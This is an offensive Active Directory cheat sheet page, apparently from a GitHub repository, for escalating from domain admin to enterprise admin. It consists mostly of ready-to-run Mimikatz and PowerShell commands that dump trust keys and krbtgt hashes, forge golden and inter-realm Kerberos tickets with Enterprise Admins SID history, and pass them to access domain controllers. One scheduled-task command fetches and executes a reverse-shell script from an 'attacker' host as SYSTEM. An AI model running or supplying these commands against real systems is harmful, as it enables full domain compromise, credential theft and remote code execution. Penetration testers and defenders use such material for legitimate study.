### DA TO EA - Domain Trust Key
```powershell
$sess = New-PSSession -ComputerName DC01.domain.local
Enter-PSSession -Session $sess
# EP + AMSI BYPASS + EXIT
Invoke-Command -FilePath C:\path\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
Create the inter-realm TGT

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-x-x-x-x-x /sids:S-1-5-x-x-x-x-519 /rc4:00000000000000000000000000000000 /service:krbtgt /target:domain.local /ticket:C:\path\trust_tkt.kirbi"'
```

Create the TGS for service in parent domain
```powershell
.\asktgs.exe C:\path\trust_tkt.kirbi CIFS/DC01.domain.local
.\kirbikator.exe lsa .\CIFS.DC01.domain.local.kirbi
```

### DA TO EA - KRBTGT Hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:00000000000000000000000000000000 /ticket:C:\path\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krbtgt_tkt.kirbi"'
schtasks /create /S DC01.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "taskname" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://attacker/Invoke-PowerShellTcpEx.ps1''')'"
# SET UP YOU LISTENER
schtasks /Run /S DC01.domain.local /TN "taskname"
```

### Acces Share test.domain.local to domain2.local forest
```powershell
# KEYS
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# TGT
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:test.domain.local /sid:S-1-5-x-x-x-x /rc4:00000000000000000000000000000000 /service:krbtgt /domain.local /ticket:C:\path\trust_forest_tkt.kirbi"'
# TGS for a service (CIFS)
.\asktgs.exe C:\path\trust_forest_tkt.kirbi CIFS/DC01.domain2.local
# Present the TGS to the service (CIFS)
.\kirbikator.exe lsa .\CIFS.DC01.domain2.local.kirbi

```

:information_source: Well-known security identifiers. (S-1-5-21domain)
| Property flag | Value in hexadecimal |
|---|---|
| 500 | Administrator |
| 501 | Guest |
| 502 | KRBTGT |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)